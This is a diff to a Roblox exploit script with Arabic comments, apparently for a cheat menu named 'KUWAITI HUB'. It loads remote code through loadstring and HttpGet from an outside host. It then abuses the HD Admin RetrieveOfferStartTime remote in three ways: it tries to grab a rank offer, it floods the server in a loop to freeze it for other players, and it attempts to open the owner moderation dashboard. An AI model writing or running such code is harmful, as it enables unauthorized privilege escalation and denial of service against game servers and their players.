@@ -1,7 +1,43 @@
-local hdMain = require(game:GetService("ReplicatedStorage"):WaitForChild("HDAdminSetup")):GetMain()
-local dashboard = hdMain:GetModule("Dashboard")
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
-pcall(function()
-    dashboard:Setup()
-    dashboard:OpenPage("Moderation") -- يفتح لك صفحة الطرد والحظر
-end)
+local Window = Rayfield:CreateWindow({
+   Name = "KUWAITI HUB | شاليه محمد 💣",
+   KeySystem = false
+})
+
+local Tab = Window:CreateTab("اختراق الرتبة 🛠️", 4483362458)
+
+-- 1. ثغرة الحصول على العرض (التي اصطدتها أنت)
+Tab:CreateButton({
+   Name = "تفعيل عرض الرتبة (Rank Offer)",
+   Callback = function()
+       local args = {[1] = true}
+       game:GetService("ReplicatedStorage").HDAdminHDClient.Signals.RetrieveOfferStartTime:InvokeServer(unpack(args))
+       Rayfield:Notify({Title = "يوسف هب", Content = "تم إرسال طلب تفعيل العرض.. تحقق من الشات", Duration = 3})
+   end,
+})
+
+-- 2. تجميد السيرفر باستخدام نفس الريموت (Lagger)
+Tab:CreateToggle({
+   Name = "تعليق السيرفر (Lagger)",
+   CurrentValue = false,
+   Callback = function(Value)
+       _G.Lag = Value
+       while _G.Lag do
+           -- سنستخدم نفس الريموت الذي وجدته لعمل ضغط على السيرفر
+           game:GetService("ReplicatedStorage").HDAdminHDClient.Signals.RetrieveOfferStartTime:InvokeServer(true)
+           task.wait() 
+       end
+   end,
+})
+
+-- 3. فتح صفحة الأونر (بناءً على ملف الـ Decompiled السابق)
+Tab:CreateButton({
+   Name = "محاولة فتح لوحة التحكم",
+   Callback = function()
+       pcall(function()
+           local hdMain = require(game:GetService("ReplicatedStorage"):WaitForChild("HDAdminSetup")):GetMain()
+           hdMain:GetModule("Dashboard"):OpenPage("Moderation")
+       end)
+   end,
+})
